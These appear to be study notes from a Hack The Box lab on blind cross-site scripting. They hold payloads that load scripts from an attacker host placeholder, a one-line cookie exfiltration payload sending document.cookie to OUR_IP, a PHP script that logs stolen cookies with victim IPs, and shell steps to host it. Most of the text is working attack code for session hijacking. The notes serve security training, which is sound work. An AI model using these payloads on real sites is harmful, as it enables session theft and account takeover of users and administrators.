## Blind XSS Detection

Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header
## Loading a Remote Script

```html
<script src="http://OUR_IP/script.js"></script>
```

```html
<script src="http://OUR_IP/username"></script>
```

```html
<script src=http://OUR_IP></script> 
'><script src=http://OUR_IP></script> 
"><script src=http://OUR_IP></script> 
javascript:eval('var 
a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)') <script>function b(){eval(this.responseText)};a=new 
XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script> 
<script>$.getScript("http://OUR_IP")
</script>
```

```shell
3kjS@htb[/htb]$ mkdir /tmp/tmpserver 
3kjS@htb[/htb]$ cd /tmp/tmpserver 
3kjS@htb[/htb]$ sudo php -S 0.0.0.0:80 
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field 
<script src=http://OUR_IP/username></script> #this goes inside the username field 
...SNIP...
```
## Session Hijacking

```js
document.location='http://OUR_IP/index.php?c='+document.cookie; new 
Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

We can write any of these JavaScript payloads to `script.js`, which will be hosted on our VM as well:

```js
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

```html
<script src=http://OUR_IP/script.js></script>
```

We can save the following PHP script as `index.php`, and re-run the PHP server again:

```php
<?php 
if (isset($_GET['c'])) { 
	$list = explode(";", $_GET['c']); 
	foreach ($list as $key => $value) { 
		$cookie = urldecode($value); 
		$file = fopen("cookies.txt", "a+"); 
		fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n"); 
		fclose($file);
	} 
}
?>
```

```shell
3kjS@htb[/htb]$ cat cookies.txt 
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```
![](Pasted%20image%2020260627151507.png)
